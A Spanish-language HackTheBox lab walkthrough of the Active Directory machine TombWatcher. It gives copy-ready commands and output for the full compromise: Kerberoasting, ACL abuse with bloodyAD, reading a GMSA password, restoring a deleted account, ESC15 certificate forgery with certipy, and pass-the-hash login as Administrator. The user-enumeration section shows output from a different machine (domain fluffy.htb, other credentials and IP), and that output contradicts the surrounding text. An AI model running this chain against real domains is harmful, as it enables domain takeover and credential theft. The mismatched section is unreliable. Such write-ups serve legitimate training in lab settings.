---
title: "HTB: TombWatcher"
date: 2026-04-15 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, ADCS, ESC15, Kerberoasting, GMSA, BloodyAD, AD-RecycleBin, CVE-2024-49019]
image:
  path: /assets/img/TombWatcher-HTB.png
  alt: HackTheBox TombWatcher Machine
  width: 500
  height: 280
  class: sz-contain
---

## Introducción

**TombWatcher** es una máquina de **HackTheBox** enfocada en entornos de **Active Directory**.
El acceso inicial se obtiene abusando de un permiso **WriteSPN** para realizar **Targeted
Kerberoasting** sobre el usuario `Alfred`, cuyo hash se crackea para obtener sus credenciales.
A partir de ahí, se encadena una serie de abusos de **ACLs**: `AddSelf` para unirse al grupo
**Infrastructure**, lectura de contraseña **GMSA** de `ansible_dev$`, `ForceChangePassword`
sobre `SAM` y `WriteOwner` para comprometer al usuario `john`. La escalada de privilegios
involucra la restauración de un objeto eliminado (**AD Recycle Bin**), la recuperación de la
cuenta `cert_admin` que mantiene derechos de enrolamiento en un template **ADCS**, y la
explotación de **ESC15 (CVE-2024-49019)** para impersonar al `Administrator` y obtener
control total del dominio.

---

## Reconocimiento

### Comprobación de conectividad

Se enviará una solicitud de **ICMP** (`ping`) para comprobar que la máquina objetivo se
encuentra activa y accesible.

```bash
ping -c 1 10.129.232.167
```

```
64 bytes from 10.129.232.167: icmp_seq=1 ttl=127 time=92.9 ms
```

### Escaneo de Puertos

Se ejecutará un escaneo de puertos con **Rustscan** para identificar los servicios expuestos
en la máquina objetivo.

```bash
rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
```

**Resultados relevantes:**

| Puerto | Estado   | Servicio                  |
|--------|----------|---------------------------|
| 53     | open     | Simple DNS Plus           |
| 80     | open     | Microsoft IIS 10.0        |
| 88     | open     | Kerberos                  |
| 135    | open     | MS RPC                    |
| 139    | open     | NetBIOS                   |
| 389    | open     | LDAP (AD)                 |
| 445    | open     | SMB                       |
| 464    | open     | Kpasswd5                  |
| 593    | open     | RPC over HTTP             |
| 636    | open     | LDAPS                     |
| 3268   | open     | LDAP Global Catalog       |
| 3269   | filtered | LDAPS Global Catalog      |
| 5985   | open     | WinRM (HTTP)              |
| 9389   | open     | .NET Message Framing      |

### Análisis del escaneo

Los puertos habituales de **Active Directory** se encuentran abiertos, incluyendo **DNS**,
**Kerberos**, **LDAP**, **SMB** y **WinRM**, lo que confirma que el host corresponde a un
**Controlador de Dominio** dentro del entorno `tombwatcher.htb`.

- **Firma SMB:** La firma obligatoria está habilitada, lo que descarta ataques de
  retransmisión **NTLM**. Será necesario buscar otros vectores de ataque.
- **ADCS detectado:** Los certificados SSL exponen la CA interna `tombwatcher-CA-1`,
  lo que indica la presencia de **Active Directory Certificate Services**.
- **WinRM habilitado:** El puerto `5985` está abierto, lo que permite acceso remoto con
  credenciales válidas mediante **Windows Remote Management**.
- **Desfase horario:** Se detectó una diferencia de 4 horas entre el servidor y nuestra
  máquina. Este detalle es crítico para ataques **Kerberos**.

---

## Enumeración inicial (NXC)

Reutilizaremos las credenciales filtradas por el creador para realizar una enumeración autenticada.

### Enumeración de usuarios

```bash
nxc smb $IP -u 'henry' -p 'H3nry_987TGV!' --users
```

```
SMB   10.129.17.155  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB   10.129.17.155  445  DC01  [+] fluffy.htb\p.agila:prometheusx-303
SMB   10.129.17.155  445  DC01  -Username-          -Last PW Set-          -BadPW-  -Description-
SMB   10.129.17.155  445  DC01  Administrator        2025-04-17 15:45:01 0           Built-in account for administering the computer/domain
SMB   10.129.17.155  445  DC01  Guest                <never>             0           Built-in account for guest access to the computer/domain
SMB   10.129.17.155  445  DC01  krbtgt               2025-04-17 16:00:02 0           Key Distribution Center Service Account
SMB   10.129.17.155  445  DC01  ca_svc               2025-04-17 16:07:50 0
SMB   10.129.17.155  445  DC01  ldap_svc             2025-04-17 16:17:00 0
SMB   10.129.17.155  445  DC01  p.agila              2025-04-18 14:37:08 0
SMB   10.129.17.155  445  DC01  winrm_svc            2025-05-18 00:51:16 0
SMB   10.129.17.155  445  DC01  j.coffey             2025-04-19 12:09:55 0
SMB   10.129.17.155  445  DC01  j.fleischman         2025-05-16 14:46:55 0
SMB   10.129.17.155  445  DC01  [*] Enumerated 9 local users: FLUFFY
```

### Enumeración de recursos compartidos

```bash
nxc smb $IP -u 'henry' -p 'H3nry_987TGV!' --shares
```

```
SMB   10.129.17.155  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB   10.129.17.155  445  DC01  [+] fluffy.htb\p.agila:prometheusx-303
SMB   10.129.17.155  445  DC01  [*] Enumerated shares
SMB   10.129.17.155  445  DC01  Share        Permissions   Remark
SMB   10.129.17.155  445  DC01  -----        -----------   ------
SMB   10.129.17.155  445  DC01  ADMIN$                     Remote Admin
SMB   10.129.17.155  445  DC01  C$                         Default share
SMB   10.129.17.155  445  DC01  IPC$         READ          Remote IPC
SMB   10.129.17.155  445  DC01  IT           READ,WRITE
SMB   10.129.17.155  445  DC01  NETLOGON     READ          Logon server share
SMB   10.129.17.155  445  DC01  SYSVOL       READ          Logon server share
```

Los resultados muestran los recursos predeterminados de **Active Directory** (`ADMIN$`, `C$`,
`IPC$`, `NETLOGON` y `SYSVOL`), sin recursos no estándar de interés inmediato.

---

## Análisis de Dominio - BloodHound

Recopilamos información del dominio con las credenciales obtenidas para identificar
rutas de ataque y escalada de privilegios.

```bash
bloodhound-ce-python -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -ns $IP -c All --zip
```

### WriteSPN → Targeted Kerberoasting sobre Alfred

BloodHound revela que `henry` tiene el permiso `WriteSPN` sobre `alfred`, lo que le permite
modificar el atributo **servicePrincipalName** y realizar **Targeted Kerberoasting**.

![WriteSPN](/assets/img/tombwatcher/writespn.png)

```bash
targetedKerberoast -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --dc-host dc01.tombwatcher.htb
```

```
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$f12e04dd...
```

Crackeamos el hash offline con **Hashcat**:

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

**Contraseña:** `basketball`

---

## AddSelf: Alfred → Infrastructure

Verificamos si `alfred` tiene shell remota:

```bash
nxc winrm $IP -u 'alfred' -p 'basketball'
```

```
[-] tombwatcher.htb\alfred:basketball
```

Sin acceso directo por **WinRM**. BloodHound muestra que `alfred` tiene el permiso `AddSelf`
sobre el grupo **Infrastructure**:

![AddSelf](/assets/img/tombwatcher/addself.png)

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'alfred' -p 'basketball' add groupMember 'INFRASTRUCTURE' 'alfred'
```

```
[+] alfred added to INFRASTRUCTURE
```

---

## ReadGMSAPassword: Infrastructure → ansible_dev$

Una vez en el grupo **Infrastructure**, BloodHound revela que este grupo tiene el permiso
`ReadGMSAPassword` sobre la cuenta `ansible_dev$`.

![ReadGMSA](/assets/img/tombwatcher/readgmsa.png)

```bash
nxc ldap $IP -u 'alfred' -p 'basketball' --gmsa
```

```
Account: ansible_dev$    NTLM: 7e792e4c14e4040a0b4f18235a6afe55
PrincipalsAllowedToReadPassword: Infrastructure
```

---

## ForceChangePassword: ansible_dev$ → SAM

BloodHound revela que `ansible_dev$` tiene el permiso `ForceChangePassword` sobre el
usuario `SAM`.

![ForceChangePassword](/assets/img/tombwatcher/forcechange.png)

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'ansible_dev$' -p ':7e792e4c14e4040a0b4f18235a6afe55' set password 'SAM' 'Password!'
```

```
[+] Password changed successfully!
```

---

## WriteOwner: SAM → JOHN

BloodHound muestra que `SAM` tiene el permiso `WriteOwner` sobre el usuario `john`.

![WriteOwner](/assets/img/tombwatcher/writeowner.png)

### 1. Hacerse owner de JOHN

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'SAM' -p 'Password!' set owner 'JOHN' 'sam'
```

```
[+] Old owner is now replaced by sam on JOHN
```

### 2. Agregar GenericAll sobre JOHN

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'sam' -p 'Password!' add genericAll 'JOHN' 'sam'
```

```
[+] sam has now GenericAll on JOHN
```

### 3. Cambiar contraseña de JOHN

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'SAM' -p 'Password!' set password 'JOHN' 'Password!'
```

```
[+] Password changed successfully!
```

---

## Acceso Inicial: Evil-WinRM como john

```bash
evil-winrm -i $IP -u 'john' -p 'Password!'
```

### Flag de usuario

```powershell
*Evil-WinRM* PS C:\Users\john> type Desktop\user.txt
9d3bf49300af2bc41300601635ded142
```

---

## Escalada de Privilegios

El escaneo inicial detectó la CA interna `tombwatcher-CA-1`. Enumeramos los templates
de certificado disponibles:

```bash
certipy find -u john -p 'Password!' -dc-ip $IP -enabled -stdout
```

Se detecta el template **WebServer** con un **SID huérfano** en los permisos de enrolamiento:

```
Enrollment Rights: TOMBWATCHER.HTB\Domain Admins
                   TOMBWATCHER.HTB\Enterprise Admins
                   S-1-5-21-1392491010-1358638721-2126982587-1111
```

![BloodHound ADCS](/assets/img/tombwatcher/acds.png)

> Un **SID** que no resuelve a ningún nombre indica que la cuenta fue **eliminada**, pero
> el **ACE** en el template sigue activo en AD. Si restauramos esa cuenta, recuperamos
> automáticamente sus derechos de enrolamiento.

### Identificar el objeto eliminado (AD Recycle Bin)

Desde **Evil-WinRM** como `john`, buscamos el objeto por SID:

```powershell
Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -IncludeDeletedObjects -Properties *
```

```
sAMAccountName : cert_admin
isDeleted      : True
ObjectGUID     : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
LastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
```

### Restaurar cert_admin

```powershell
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```

### Obtener control sobre cert_admin

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'john' -p 'Password!' add genericAll cert_admin john
```

```
[+] john has now GenericAll on cert_admin
```

### Habilitar y resetear contraseña de cert_admin

Los objetos restaurados desde Recycle Bin vuelven **deshabilitados**:

```powershell
Enable-ADAccount -Identity cert_admin
```

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'john' -p 'Password!' set password cert_admin 'Password!'
```

```
[+] Password changed successfully!
```

---

## ESC15 — CVE-2024-49019

Confirmamos la vulnerabilidad con `cert_admin`:

```bash
certipy find -u cert_admin@tombwatcher.htb -p 'Password!' -dc-host dc01.tombwatcher.htb -vulnerable -stdout
```

```
Template Name       : WebServer
Schema Version      : 1
Enrollee Supplies Subject: True
[!] Vulnerabilities
  ESC15: Enrollee supplies subject and schema version is 1.
```

Los templates con **Schema Version 1** no tienen el atributo `msPKI-RA-Application-Policies`,
por lo que la CA no puede restringir qué **Application Policies** se inyectan en el CSR.
Esto permite agregar el OID de **Enrollment Agent** (`1.3.6.1.4.1.311.20.2.1`) y solicitar
certificados en nombre de otros usuarios.

### 1. Obtener certificado como Enrollment Agent

```bash
certipy req -u cert_admin@tombwatcher.htb -p 'Password!' -dc-ip $IP -ca tombwatcher-CA-1 -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1'
```

```
[*] Successfully requested certificate
[*] Saving certificate and private key to 'cert_admin.pfx'
```

### 2. Impersonar Administrator

```bash
certipy req -u cert_admin@tombwatcher.htb -p 'Password!' -dc-ip $IP -ca tombwatcher-CA-1 -target dc01.tombwatcher.htb -template User -on-behalf-of 'tombwatcher\administrator' -pfx cert_admin.pfx
```

```
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

### 3. Autenticarse con el certificado

```bash
certipy auth -pfx administrator.pfx -dc-ip $IP
```

```
[*] Got TGT
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

---

## Acceso Final como Administrador

```bash
evil-winrm -i $IP -u 'administrator' -H 'f61db423bebe3328d33af26741afe5fc'
```

### Flag de root

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
588042187c6e14b266f7cab41fb00267
```

**¡Máquina comprometida con éxito!**
